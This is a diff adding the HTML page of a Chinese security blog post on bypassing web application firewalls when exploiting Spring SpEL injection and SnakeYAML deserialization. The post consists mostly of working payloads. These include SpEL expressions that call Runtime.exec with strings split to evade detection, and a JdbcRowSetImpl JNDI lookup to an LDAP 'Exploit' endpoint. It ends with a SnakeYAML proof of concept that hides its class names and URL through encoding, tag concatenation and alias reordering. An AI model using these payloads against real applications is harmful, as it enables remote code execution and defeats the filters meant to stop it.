@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>spel注入和snakeyaml反序列化waf bypass trick - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">spel注入和snakeyaml反序列化waf bypass trick</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#spel注入"><span class="toc-text">spel注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#snakeyaml反序列化"><span class="toc-text">snakeyaml反序列化</span></a></li></ol>
+
+  <div class="post-content">
+    <p>22年的时候的存货，翻到了发一下</p>
+<h1 id="spel注入"><a href="#spel注入" class="headerlink" title="spel注入"></a>spel注入</h1><ul>
+<li>网上已有的方法都把spel当成单链执行，也就是只能是一条方法调用链的形式，并且从spel的文档上看一条spel语句也只能在最外层有一次变量的赋值，但实际上将要执行的语句放在数组里就可以达到多语句的效果，比如：</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Object[]&#123;#a='java.lang.Run',#b='time',#c=T(String),#d=#c.class,#e=#d.forName(#a+#b),#f=#e.getRuntime(),#g='calc.exe',#f.exec(#g)&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>spel在读取属性和设置属性时也会去尝试调用该属性的getter和setter，可以当成fastjson用，避免显示方法的调用</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Object[]&#123;#a=new com.sun.rowset.JdbcRowSetImpl(),#a.dataSourceName='ldap://localhost:1389/Exploit',#a.autoCommit=true&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用<code>.?</code>获取方法</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Object[]&#123;#a = T(Class).getMethods().?[#this.getName().equals("forNa"+"me")][2], #b = #a("java.lan"+'g.Runtime'), #c = #b.getRuntime().exec('touch /tmp/xxxx')&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="snakeyaml反序列化"><a href="#snakeyaml反序列化" class="headerlink" title="snakeyaml反序列化"></a>snakeyaml反序列化</h1><ul>
+<li><p>双引号中可以使用unicode和hex编码</p>
+</li>
+<li><p>标签（也就是类名）的位置可以多一层url编码</p>
+</li>
+<li><p>通过标签的拼接避免<code>!!</code>的使用以及拆分恶意类名，这个<a href="https://mp.weixin.qq.com/s/2i6Q9Ob7n0cSxuj9Rob8Uw#at" target="_blank" rel="noopener">SnakeYaml 反序列化的一个小 trick</a>中浅蓝师傅发过了。</p>
+</li>
+<li><p>一些waf的检测规则会指定不同字段之间顺序，可以使用yaml的alias和anchor功能（<code>&amp;</code>和<code>*</code>）来改变顺序。</p>
+</li>
+<li><p>利用多个<code>java.lang.Character</code>构造<code>com.sun.xml.internal.fastinfoset.util.CharArray</code>，再实例化<code>java.lang.StringBuilder</code>和<code>java.lang.String</code>，达到拆分字符串的效果。很尴尬的是这种组合而成sequence不能用在key的位置（也就是属性名），只能用在具体属性值的地方，可以用来绕过一些对<code>ldap://</code> <code>rmi://</code>的检测。不过因为fastjson和snakeyaml选择构造函数方法的不同，这个方法fastjson并不能用</p>
+</li>
+</ul>
+<p>一个结合了上面几种手法的poc：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="string">!---!</span> <span class="string">tag:yaml.org,2002:com%2Esun%2Erowset%2EJdbcRo</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!!java</span><span class="string">.lang.String</span> <span class="string">&amp;A</span> <span class="string">[!!java.lang.StringBuilder</span> <span class="string">[!!com.sun.xml.internal.fastinfoset.util.CharArray</span> <span class="string">[[!!java.lang.Character</span> <span class="string">"l"</span><span class="string">,!!java.lang.Character</span> <span class="string">"d"</span><span class="string">,!!java.lang.Character</span> <span class="string">"a"</span><span class="string">,!!java.lang.Character</span> <span class="string">"p"</span><span class="string">,!!java.lang.Character</span> <span class="string">":"</span><span class="string">,!!java.lang.Character</span> <span class="string">"/"</span><span class="string">,!!java.lang.Character</span> <span class="string">"/"</span><span class="string">,!!java.lang.Character</span> <span class="string">"l"</span><span class="string">,!!java.lang.Character</span> <span class="string">"o"</span><span class="string">,!!java.lang.Character</span> <span class="string">"c"</span><span class="string">,!!java.lang.Character</span> <span class="string">"a"</span><span class="string">,!!java.lang.Character</span> <span class="string">"l"</span><span class="string">,!!java.lang.Character</span> <span class="string">"h"</span><span class="string">,!!java.lang.Character</span> <span class="string">"o"</span><span class="string">,!!java.lang.Character</span> <span class="string">"s"</span><span class="string">,!!java.lang.Character</span> <span class="string">"t"</span><span class="string">,!!java.lang.Character</span> <span class="string">":"</span><span class="string">,!!java.lang.Character</span> <span class="string">"1"</span><span class="string">,!!java.lang.Character</span> <span class="string">"3"</span><span class="string">,!!java.lang.Character</span> <span class="string">"8"</span><span class="string">,!!java.lang.Character</span> <span class="string">"9"</span><span class="string">,!!java.lang.Character</span> <span class="string">"/"</span><span class="string">,!!java.lang.Character</span> <span class="string">"E"</span><span class="string">,!!java.lang.Character</span> <span class="string">"x"</span><span class="string">,!!java.lang.Character</span> <span class="string">"p"</span><span class="string">,!!java.lang.Character</span> <span class="string">"l"</span><span class="string">,!!java.lang.Character</span> <span class="string">"o"</span><span class="string">,!!java.lang.Character</span> <span class="string">"i"</span><span class="string">,!!java.lang.Character</span> <span class="string">"t"</span><span class="string">],0,29,false]]]</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!!java</span><span class="string">.lang.String</span> <span class="string">&amp;B</span> <span class="string">"\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\x4e\x61\x6d\x65"</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">!---!wSetImpl</span></span><br><span class="line">   <span class="string">?</span> <span class="meta">*B</span></span><br><span class="line">   <span class="string">:</span> <span class="meta">*A</span></span><br><span class="line">   <span class="string">"\x61\x75\x74\x6f\x43\x6f\x6d\x6d\x69\x74"</span><span class="string">:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2025-02-09</span>
+  </div>
+
+  <div class="post-footer">
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    </div>
+  </body>
+</html>
